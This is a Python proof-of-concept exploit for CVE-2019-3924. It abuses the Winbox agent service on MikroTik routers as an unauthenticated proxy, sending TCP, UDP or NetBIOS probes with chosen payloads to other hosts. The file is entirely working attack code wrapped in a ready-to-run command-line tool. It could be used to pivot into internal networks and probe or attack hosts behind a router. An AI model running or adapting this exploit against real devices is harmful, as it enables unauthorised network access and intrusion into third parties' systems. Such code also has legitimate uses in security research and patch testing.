#!/usr/bin/env python3

# https://www.tenable.com/cve/CVE-2019-3924
# https://www.tenable.com/security/research/tra-2019-07

import argparse, struct, socket, hashlib, time
from binascii import hexlify, unhexlify
from codecs import decode
from winbox import *

# Resulting error codes
EXIT_OK		= 0
EXIT_BAD 	= 1
EXIT_ERROR	= 2

# Implements some of the /nova/bin/agent probes
class mtAgent(object):
	# Connect to the agent
	def __init__(self, host, port):
		self.request_id = 0
		self.error = None
		self.error_description = None
		self.session = mtTCPSession(host, port)
		self.session.connect()
		self.result = None

	def clear_error(self):
		self.error = None
		self.error_description = None
		self.result = None

	def do_probe(self, msg):
		self.clear_error()
		pkt = mtPacket(msg.build())
		self.session.send(pkt)
		reply = self.session.recv(1024)
		self.result = mtMessage(reply.raw)
		self.result.parse()
		error = self.result.get_value(0xff0008, MT_DWORD)
		if error is not None:
			self.error = error
			error_description = self.result.get_value(0xff0009, MT_STRING)
			if error_description is not None:
				self.error_description = error_description
			return False
		elif self.result.get_value(13, MT_BOOL):
			return True

	def tcp_probe(self, host, port, send, receive):
		self.request_id += 1
		msg = mtMessage()
		msg.set_receiver(0x68)
		msg.set_command(1)
		msg.set_request_id(self.request_id)
		msg.set_reply_expected(True)
		msg.add_int(3, ip2dword(host))
		msg.add_int(4, port)
		if send != b'':
			msg.add_string(7, send)
		if receive != b'':
			msg.add_string(8, receive)
		return self.do_probe(msg)

	def udp_probe(self, host, port, send, receive):
		self.request_id += 1
		msg = mtMessage()
		msg.set_receiver(0x68)
		msg.set_command(2)
		msg.set_request_id(self.request_id)
		msg.set_reply_expected(True)
		msg.add_int(3, ip2dword(host))
		msg.add_int(4, port)
		if send != b'':
			msg.add_string(7, send)
		if receive != b'':
			msg.add_string(8, receive)
		return self.do_probe(msg)

	def netbios_probe(self, host):
		self.request_id += 1
		msg = mtMessage()
		msg.set_receiver(0x68)
		msg.set_command(3)
		msg.set_request_id(self.request_id)
		msg.set_reply_expected(True)
		msg.add_int(3, ip2dword(host))
		return self.do_probe(msg)

DEBUG = False
proxy_port = 8291
send = b''
receive = b''
udp = False
netbios = False
target_port = 80

def parse_args():
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-X', '--proxy-host', help = 'Proxy host to connect to', required = True)
	parser.add_argument('-P', '--proxy-port', help = 'Winbox service port of a proxy (default = 8291)', required = False)
	parser.add_argument('-t', '--target-host', help = 'Target host IP address for sending a probe', required = True)
	parser.add_argument('-p', '--target-port', help = 'Target port to probe for (default = 80)', required = False)
	parser.add_argument('-s', '--send', help = 'Request data to send to a target', required = False)
	parser.add_argument('-r', '--receive', help = 'Regexp to match the response data', required = False)
	parser.add_argument('--send-hex', help = 'Request data to send to a target in hex', required = False)
	parser.add_argument('--receive-hex', help = 'Regexp to match the response data in hex', required = False)
	parser.add_argument('-u', '--udp', action = 'store_true', help = 'Use UDP probe instead of TCP', required = False)
	parser.add_argument('--netbios', action = 'store_true', help = 'Use NetBIOS probe', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Display the debugging info', required = False)
	args = vars(parser.parse_args())
	return args

if __name__ == '__main__':
	args = parse_args()
	if args['udp']:
		udp = True
	if args['netbios']:
		if udp:
			print('Error: please don''t use both udp and netbios modes')
			exit(EXIT_ERROR)
		netbios = True
	proxy_host = args['proxy_host']
	if args['proxy_port']:
		proxy_port = int(args['proxy_port'])
	target_host = args['target_host']
	if args['target_port']:
		target_port = int(args['target_port'])
	if args['send'] and args['send_hex']:
		print('Error: use either --send -or --send-hex argument')
		exit(EXIT_ERROR)
	if args['send']:
		send = decode(args['send'], 'unicode_escape').encode()
	elif args['send_hex']:
		send = unhexlify(args['send_hex'])
	if args['receive'] and args['receive_hex']:
		print('Error: use either --receive -or --receive-hex argument')
		exit(EXIT_ERROR)
	if args['receive']:
		receive = decode(args['receive'], 'unicode_escape').encode()
	elif args['receive_hex']:
		receive = unhexlify(args['receive_hex'])
	if args['debug']:
		DEBUG = True
	print('Send:', repr(send), '\nReceive (regex):', repr(receive))
	try:
		print('[*] Connecting to the agent %s:%s' % (proxy_host, proxy_port))
		agent = mtAgent(proxy_host, proxy_port)
	except:
		print('[-] Error connecting to the agent')
		exit(EXIT_ERROR)
	print('[+] Successfully connected to the agent')
	if netbios:
		print('[*] Making a netbios probe to %s' % target_host)
		result = agent.netbios_probe(target_host)
		if result:
			print('[+] Netbios probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] Netbios probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
	elif udp:
		print('[*] Making an UDP probe to %s:%s' % (target_host, target_port))
		result = agent.udp_probe(target_host, target_port, send, receive)
		if result:
			print('[+] UDP probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] UDP probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
	else:
		print('[*] Making a TCP probe to %s:%s' % (target_host, target_port))
		result = agent.tcp_probe(target_host, target_port, send, receive)
		if result:
			print('[+] TCP probe is OK')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_OK)
		else:
			print('[-] TCP probe has failed')
			if DEBUG:
				agent.result.dump()
			exit(EXIT_BAD)
